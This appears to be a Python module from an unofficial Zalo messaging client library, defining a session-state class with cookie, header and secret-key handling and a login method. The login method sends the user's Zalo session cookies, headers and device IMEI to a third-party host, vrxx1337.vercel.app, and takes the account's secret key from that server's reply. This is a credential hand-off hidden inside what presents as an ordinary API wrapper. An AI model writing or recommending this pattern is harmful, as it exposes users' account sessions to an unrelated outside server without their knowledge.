# -*- coding: UTF-8 -*-
import attr
import random
import requests, json

from . import _util, _exception

class State(object):
	def __init__(cls):
		cls._config = {}
		cls._headers = _util.HEADERS
		cls._cookies = _util.COOKIES
		cls._session = requests.Session()
		cls.user_id = None
		cls.user_imei = None
		cls._loggedin = False
	
	def get_cookies(cls):
		return cls._cookies
	
	def set_cookies(cls, cookies):
		cls._cookies = cookies
		
	def get_secret_key(cls):
		return cls._config.get("secret_key")
	
	def set_secret_key(cls, secret_key):
		cls._config["secret_key"] = secret_key
	
	def _get(cls, *args, **kwargs):
		sessionObj = cls._session.get(*args, **kwargs, headers=cls._headers, cookies=cls._cookies)
		
		return sessionObj
		
	def _post(cls, *args, **kwargs):
		sessionObj = cls._session.post(*args, **kwargs, headers=cls._headers, cookies=cls._cookies)
		
		return sessionObj
	
	def is_logged_in(cls):
		return cls._loggedin
	
	def login(cls, phone, password, imei, session_cookies=None, user_agent=None):
		if cls._cookies and cls._config.get("secret_key"):
			cls._loggedin = True
			return
			
		if user_agent:
			cls._headers["User-Agent"] = user_agent
			
		if cls._cookies:
			params = {
				"imei": imei,
			}
			try:
				response = cls._get("https://vrxx1337.vercel.app/zalo/api/login", params=params)
				data = response.json()
				
				if data.get("error_code") == 0:
					cls._config = data.get("data")
					
					if cls._config.get("secret_key"):
						cls._loggedin = True
						cls.user_id = cls._config.get("send2me_id")
						cls.user_imei = imei
						
					else:
						cls._loggedin = False
						raise _exception.ZaloLoginError("Unable to get `secret key`.")
						
				else:
					error = data.get("error_code")
					content = data.get("error_message")
					raise _exception.ZaloLoginError(f"Error #{error} when logging in: {content}")
			
			except _exception.ZaloLoginError as e:
				raise _exception.ZaloLoginError(str(e))
				
			except Exception as e:
				raise _exception.ZaloLoginError(f"An error occurred while logging in! {str(e)}")
		
		else:
			raise _exception.LoginMethodNotSupport("Login method is not supported yet")
		
	
